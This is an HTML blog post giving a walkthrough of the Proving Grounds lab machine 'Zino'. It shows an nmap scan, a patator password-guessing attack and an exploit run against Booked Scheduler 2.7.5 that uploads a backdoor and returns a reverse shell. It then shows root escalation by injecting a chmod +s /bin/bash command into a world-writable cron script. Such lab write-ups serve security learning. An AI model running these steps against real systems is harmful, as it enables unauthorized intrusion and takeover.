<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Zino - OSPG | Infomation Security - Blog</title><meta name="description" content="Summary Of ResultWe exploit the vulnerable Booked Scheduler CMS to obtain the initial access. We then escalate our privilege through a crontab service that w...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/zino-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Zino - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/zino-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Zino - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> August 16, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//pg">pg</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//zino">zino</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//linux">linux</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 6 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary-of-result"><strong>Summary Of Result</strong></h1><p>We exploit the vulnerable <code class="language-plaintext highlighter-rouge">Booked Scheduler CMS</code> to obtain the initial access. We then escalate our privilege through a crontab service that will execute a python file of our control.</p><hr><h1 id="attack-narrative"><strong>Attack Narrative</strong></h1><p>The attack is mounted in three main phases:</p><ul><li>Enumeration.</li><li>Exploitation.</li><li>Privilege Escalation.</li></ul><h1 id="enumeration"><strong>Enumeration</strong></h1><h4 id="nmap"><strong>Nmap</strong></h4><p>We will start with a <code class="language-plaintext highlighter-rouge">nmap</code> scan:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--open</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nv">$IP</span>

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC44YysvRUv+02vB7LK+DbEvDnTUU2Zzaj42pbyX7gL4I5DhhWWZmK4Sr/MulEE2XPnKhXCCwTVuA12C/VuFhVdnq7WjDwfV+4a1DEuDG8P7wQAux0waAsly34mGtd7HQhQIv9h7nQWcTx8hoOrF6D71eHiZmLJ6fk01VlFN75XKJGn/T/ClJHz9UJ33zwkhqXskMO9At21LfOBE+I3IQCHuFFO6DcQWw/SsZaXQxHNzLqnI/9j1aQuvyuh6KMdT6p10D577maBz+T+Hyq/qeOgbGU0YGAoXXMU36FibkoQ+WwDRYbEHYKJccUXhzFWp980PYCIDtZNaWuo/AbgryLB
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmcORNC6GjDnH1cqJrCeytZJjGrpJyY+CgseFsH27PJmSbmVYEz0ls0w/oXR0xrG/IfvxxyH9RRX2BIsBTx2cY<span class="o">=</span>
|   256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9wfKL6wusRXGDMv5Tcf2OxMAIkhvOofRPsrSQ+aMbK
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.9.5-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
3306/tcp open  mysql?      syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, NULL, RPCCheck, SSLSessionReq, WMSRequest, oracle-tns: 
|_    Host <span class="s1">'192.168.49.156'</span> is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host <span class="s1">'192.168.49.156'</span> is not allowed to connect to this MariaDB server
8003/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.38
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Index of /
</code></pre></div></div><ul><li>We are particularly interested in the HTTP service running on port 8003.</li></ul><h4 id="http-service---port-8003"><strong>HTTP Service - Port 8003</strong></h4><p>Lets us navigate to the website:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.175.64:8003 | html2text
</code></pre></div></div><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gs">****** Index of / ******</span>
<span class="gu">[[ICO]] Name    Last_modified    Size Description
===========================================================================
**[[DIR]] booked/ 2019-02-05 21:02    -**
===========================================================================
</span>     Apache/2.4.38 (Debian) Server at 192.168.175.64 Port 8003
</code></pre></div></div><p>Clicked on the <code class="language-plaintext highlighter-rouge">booked</code>, the website redirects us to a new directory - <code class="language-plaintext highlighter-rouge">/Web/index.php</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.156.64:8003/booked/Web/index.php | html2text
</code></pre></div></div><div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Toggle navigation     [Booked_Scheduler_-_Log_In]
<span class="p">    *</span> Schedule
          o View_Schedule
          o View_Calendar
<span class="p">    *</span> Help
          o Help
          o About
<span class="p">    *</span> Log_In
[Booked Scheduler - Log In]
 [email               ]
   [<span class="gs">********************</span>]
Log In
‚Å∞ Remember Me
[...]
<span class="gs">**Booked Scheduler v2.7.5**</span>
</code></pre></div></div><p>The website seems it‚Äôs running <strong>Book Scheduler</strong> version <strong>2.7.5</strong>.</p><p>Conducting a few investigation, we discover that our target is running a vulnerable CMS. Sucessful exploitation will lead to Remote Code Execution.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit Booked Scheduler
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                                      |  Path
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Booked Scheduler 2.7.5 - Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                                                                      | php/webapps/46486.rb
Booked Scheduler 2.7.7 - Authenticated Directory Traversal                                                                                          | php/webapps/48428.txt
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</code></pre></div></div><p>However, we need to note that the prerequiste for this exploit to work is a valid <code class="language-plaintext highlighter-rouge">admin</code> credentials.</p><h4 id="admin-credentials-attack"><strong>Admin Credentials Attack</strong></h4><p>To mount a dictionary attack against <code class="language-plaintext highlighter-rouge">admin</code> user, we use <code class="language-plaintext highlighter-rouge">patator</code>, the username is <code class="language-plaintext highlighter-rouge">admin</code> and the password dictionary is <code class="language-plaintext highlighter-rouge">best1050.txt</code> from seclists.</p><p>Our command is as follow:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>patator http_fuzz <span class="nv">url</span><span class="o">=</span>http://192.168.156.64:8003/booked/Web/index.php <span class="nv">method</span><span class="o">=</span>POST <span class="nv">body</span><span class="o">=</span><span class="s1">'email=admin&amp;password=FILE0&amp;captcha=&amp;login=submit&amp;resume=&amp;language=en_us'</span> <span class="nv">0</span><span class="o">=</span>/usr/share/seclists/Passwords/Common-Credentials/best1050.txt <span class="nv">follow</span><span class="o">=</span>1 <span class="nt">-x</span> ignore:fgrep<span class="o">=</span><span class="s1">'could not match'</span>

02:54:48 patator    INFO - Starting Patator 0.9 <span class="o">(</span>https://github.com/lanjelot/patator<span class="o">)</span> with python-3.9.2 at 2021-08-15 02:54 EDT
02:54:48 patator    INFO -                                                                              
02:54:48 patator    INFO - code size:clen       <span class="nb">time</span> | candidate                          |   num | mesg
02:54:48 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
02:54:53 patator    INFO - 200  13017:-1       1.005 | adminadmin                         |   118 | HTTP/1.1 200 OK
02:55:23 patator    INFO - Hits/Done/Skip/Fail/Size: 1/1049/0/0/1049, Avg: 29 r/s, Time: 0h 0m 35s
</code></pre></div></div><p>After a few second, <code class="language-plaintext highlighter-rouge">patator</code> yielded <code class="language-plaintext highlighter-rouge">adminadmin</code> as our <code class="language-plaintext highlighter-rouge">admin</code> password.</p><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><h4 id="booked-scheduler-file-upload"><strong>Booked Scheduler File Upload</strong></h4><p>Since we have <code class="language-plaintext highlighter-rouge">admin</code> credentials, we can use any public exploit to obtain reverse shell or via <strong>Metasploit</strong>, but since Metasploit is really <strong>unstable</strong>, we can also choose to manually exploit it.</p><ul><li>PoC can be found <a href="https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF">here.</a></li></ul><p>(The below exploit script I used can be found <a href="https://github.com/jayngng/bookedScheduler_v2.7.5_RCE">here.</a>)</p><ul><li>On our terminal, execute:<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 booked_scheduler.py <span class="nt">--url</span> http://192.168.156.64:8003/booked/Web <span class="nt">-u</span> admin <span class="nt">-p</span> adminadmin <span class="nt">-P</span> 21 <span class="nt">-H</span> 192.168.49.156
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking host: http://192.168.156.64:8003/booked/Web
<span class="o">[</span>+] Checking version Booked Scheduler v2.7.5: VULNERABLE <span class="o">!!!</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking credentials: admin:adminadmin
<span class="o">[</span>+] Successfully logged <span class="k">in</span> <span class="o">!</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Grabing token: <span class="nv">YjEzYzQ4NzIxMWZmMTU2MTU5N2NlMGM4NmI4MGJlMTE</span><span class="o">=</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading backdoor shell...
<span class="o">[</span>+] Trying to <span class="nb">bind </span>to :: on port 21: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Triggering the shell ... 
<span class="o">[</span>+] Waiting <span class="k">for </span>connections on :::21: Got connection from ::ffff:192.168.156.64 on port 58506
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>561<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@zino:/var/www/html/booked/Web<span class="nv">$ </span><span class="err">$</span>
www-data@zino:/var/www/html/booked<span class="nv">$ $ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div></li></ul><p>Our listener caught the reverse shell at port 21 as <code class="language-plaintext highlighter-rouge">www-data</code> user.</p><hr><h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1><h4 id="crontab"><strong>Crontab</strong></h4><p>Local enumeration divulges an interesting crontab service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> www-data@zino:/home/peter<span class="nv">$ $ </span><span class="nb">cat</span> /etc/crontab
<span class="o">[</span>...]
<span class="k">*</span>/3 <span class="k">*</span>   <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>   root    python /var/www/html/booked/cleanup.py
</code></pre></div></div><p>The <code class="language-plaintext highlighter-rouge">/var/www/html/booked/cleanup.py</code> file is executed steadily every 3 minutes as <code class="language-plaintext highlighter-rouge">root</code>. More importantly, the file is also modificable by everyone.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zino:/home/peter<span class="nv">$ $ </span><span class="nb">ls</span> <span class="nt">-al</span> /var/www/html/booked/cleanup.py
<span class="nb">ls</span> <span class="nt">-al</span> /var/www/html/booked/cleanup.py
<span class="nt">-rwxrwxrwx</span> 1 www-data www-data 164 Apr 28  2020 /var/www/html/booked/cleanup.py
</code></pre></div></div><p>At this point, we can inject an arbitrary command requesting <code class="language-plaintext highlighter-rouge">root</code> to set a SUID sticky bit to the <code class="language-plaintext highlighter-rouge">/bin/bash</code> executable.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zino:/var/www/html/booked<span class="nv">$ $ </span><span class="nb">echo</span> <span class="s2">"os.system('chmod +s /bin/bash')"</span> <span class="o">&gt;&gt;</span> /var/www/html/booked/cleanup.py
</code></pre></div></div><p>If eveything works properly, after three minutes, we should be able to execute the <code class="language-plaintext highlighter-rouge">/bin/bash</code> with <code class="language-plaintext highlighter-rouge">root</code> privilege ‚Ä¶</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@zino:/var/www/html/booked<span class="nv">$ $ </span>/bin/bash <span class="nt">-p</span>
/bin/bash <span class="nt">-p</span>
<span class="nv">$ </span><span class="nb">whoami
</span>root
</code></pre></div></div><p>and become <code class="language-plaintext highlighter-rouge">root</code>!.</p><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security ¬© 2021-2023 ‚Ä¢ All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>